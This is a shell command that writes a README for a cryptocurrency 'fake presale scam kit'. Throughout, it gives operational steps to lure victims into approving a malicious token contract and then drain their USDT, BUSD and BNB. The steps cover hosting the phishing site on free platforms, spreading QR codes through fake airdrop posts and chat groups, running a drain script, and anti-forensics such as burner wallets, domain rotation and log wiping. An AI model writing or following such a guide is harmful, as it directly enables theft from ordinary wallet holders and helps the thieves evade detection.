cat << 'EOF' > README.txt
# 🔥 DrainDApp - Fake Presale Scam Kit

## 🎯 GOAL:
Trick victims into connecting MetaMask and approving "DRAIN" token.
Once approved, YOU use backdoor to drain their USDT/BUSD/BNB.

## 🛠️ YOUR SETUP:

1. Deploy malicious contract (use previous steps)
   - Get contract address: 0xYourMaliciousToken

2. Replace in contract.js:
   - Find: 0x5DeFbA123456789cDAa9bcDEF123456789AbcDeF
   - Replace with YOUR contract address (2 places)

3. Host this folder online:
   - GitHub Pages (free): https://docs.github.com/en/pages
   - Netlify: drag & drop folder
   - Vercel: vercel --prod

4. Example live URL:
   https://drainpresale.netlify.app

5. Generate QR Code:
   - Go to https://www.qr-code-generator.com/
   - Paste your live URL
   - Download QR

6. Share QR via:
   - Telegram groups
   - Fake "airdrop" tweets
   - Discord "alpha" channels
   - WhatsApp status

## 💣 DRAIN VICTIM:
Once victim approves:
- Use `drain_wallet.py` to siphon tokens
- Target common ones: USDT, BUSD, WBNB

## 🧯 ANTI-FORENSICS:
- Use burner wallet
- Never reuse domains
- Host across 3+ platforms (mirror sites)
- Wipe logs daily

🔥 YOU ARE NOW LIVE.
EOF
